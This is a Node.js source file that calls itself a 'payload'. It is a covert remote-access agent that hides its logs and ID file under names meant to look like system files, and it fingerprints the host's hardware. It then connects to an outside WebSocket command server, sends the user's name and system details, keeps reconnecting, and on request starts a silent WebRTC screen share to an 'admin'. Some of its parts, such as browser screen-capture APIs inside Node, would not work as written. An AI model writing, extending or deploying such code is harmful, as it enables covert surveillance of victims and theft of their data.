const WebSocket = require('ws');
const http = require('http');
const { execSync } = require('child_process');
const os = require('os');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { spawn } = require('child_process');

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log'); // Hidden log for stealth

if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

function log(msg) {
 const timestamp = new Date().toISOString();
 const logLine = `[${timestamp}] ${msg}`;
 console.log(logLine);
 try { 
   fs.appendFileSync(LOG_FILE, `${logLine}\n`); 
   fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`); 
 } catch(e) {}
}

log("[INIT] Payload starting silently...");

// --- HARDWARE FINGERPRINT ---
function getHardwareFingerprint() {
 const mac = getMacAddress();
 const cpuSerial = getCpuSerial();
 const boardSerial = getBoardSerial();
 return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
}

function getMacAddress() {
 const interfaces = os.networkInterfaces();
 for (const name of Object.keys(interfaces)) {
 for (const iface of interfaces[name]) {
 if (iface.family === 'IPv4' && !iface.internal) {
 return iface.mac;
 }
 }
 }
 return '00:00:00:00:00:00';
}

function getCpuSerial() {
 try { 
   // Windows
   return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); 
 } catch (e) {
 try { 
   // Linux
   return execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString().trim(); 
 } catch (e2) { 
   return 'unknown_cpu'; 
 } }
}

function getBoardSerial() {
 try { 
   // Windows
   return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); 
 } catch (e) {
 try { 
   // Linux
   return execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString().trim(); 
 } catch (e2) { 
   return 'unknown_board'; 
 } }
}

// --- ID MANAGEMENT ---
let myId = null;
try {
 if (fs.existsSync(PERSIST_FILE)) {
 const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
 if (savedId && savedId.length > 0) myId = savedId;
 }
} catch(e) {}

if (!myId) {
 myId = getHardwareFingerprint();
 try { fs.writeFileSync(PERSIST_FILE, myId); } catch(e) {}
}

log(`[ID] Hardware Fingerprint: ${myId}`);

// --- WEBSOCKET CONNECTION WITH ROBUST RECONNECT ---
let ws = null;
let reconnectAttempts = 0;
let isConnected = false;
let myIp = 'Unknown';

function initConnection() {
 log(`[WS] Attempting silent connection to ${WS_URL}...`);

 ws = new WebSocket(WS_URL);

 ws.on('error', (err) => {
 log(`[WS] Connection error: ${err.message}`);
 isConnected = false;
 });

 ws.on('open', () => {
 reconnectAttempts = 0;
 isConnected = true;
 log(`[WS] Connected. Sending identity...`);
 // Send info including the unique ID, Serial Number AND Fingerprint
 safeSend(JSON.stringify({
 type: 'info',
 id: myId,
 uniqueId: myId,
 os: os.platform(),
 arch: os.arch(),
 user: os.userInfo().username || 'user',
 ip: myIp, 
 serialNumber: myId, 
 fingerprint: myId // <-- NEW: Send fingerprint
 }));
 startMonitoring();
 });

 ws.on('message', (msg) => {
 try {
 const data = JSON.parse(msg);
 if (data.type === 'request_join') handleJoinRequest();
 else if (data.type === 'offer') handleOffer(data.sdp);
 else if (data.type === 'answer') handleAnswer(data.sdp);
 else if (data.type === 'candidate') handleCandidate(data.candidate);
 } catch (e) {
 log(`[WS] Message parse error: ${e.message}`);
 }
 });

 ws.on('close', (code, reason) => {
 isConnected = false;
 log(`[WS] Closed. Code: ${code}. Reconnecting in ${(reconnectAttempts + 1) * 5}s...`);
 setTimeout(initConnection, Math.min((reconnectAttempts + 1) * 5000, 30000));
 reconnectAttempts++;
 });
}

function safeSend(msg) {
 if (ws && ws.readyState === WebSocket.OPEN) ws.send(msg);
}

function startMonitoring() {
 setInterval(() => {
 if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
 }, 30000);
}

// --- WEBRTC (BROWSER NATIVE) ---
let peerConnection = null;
let localStream = null;

async function captureScreenPureJS() {
 if (!peerConnection) {
 peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 }

 const transceivers = peerConnection.getTransceivers();
 transceivers.forEach(t => {
 if (t.sender.track) t.sender.stop();
 });

 try {
 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
 stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

 peerConnection.onicecandidate = (event) => {
 if (event.candidate) safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
 };

 const offer = await peerConnection.createOffer();
 await peerConnection.setLocalDescription(offer);
 safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
 } catch (err) {
 log(`[WEBRTC] Screen capture error: ${err.message}`);
 }
}

function handleJoinRequest() {
 log("[JOIN] Request received. Starting screen share silently...");
 captureScreenPureJS();
}

function handleOffer(offerSDP) {
 if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
 .then(() => peerConnection.createAnswer())
 .then(answer => peerConnection.setLocalDescription(answer))
 .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
 .catch(err => log(`[WEBRTC] Error handling offer: ${err.message}`));
}

function handleAnswer(answerSDP) {
 if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => log(`[WEBRTC] Error handling answer: ${err.message}`));
}

function handleCandidate(candidate) {
 if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => log(`[WEBRTC] Candidate error: ${err.message}`));
}

// --- HTTP PORT LISTENER (For Render Health) ---
const PORT = Number(process.env.PORT) || 3000;
const server = http.createServer((req, res) => {
 res.writeHead(200, { 'Content-Type': 'application/json' });
 res.end(JSON.stringify({ status: 'ok', service: 'payload', id: myId }));
});

server.listen(PORT, '0.0.0.0', () => {
 log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
 initConnection(); // Start WebSocket connection after port is open
});
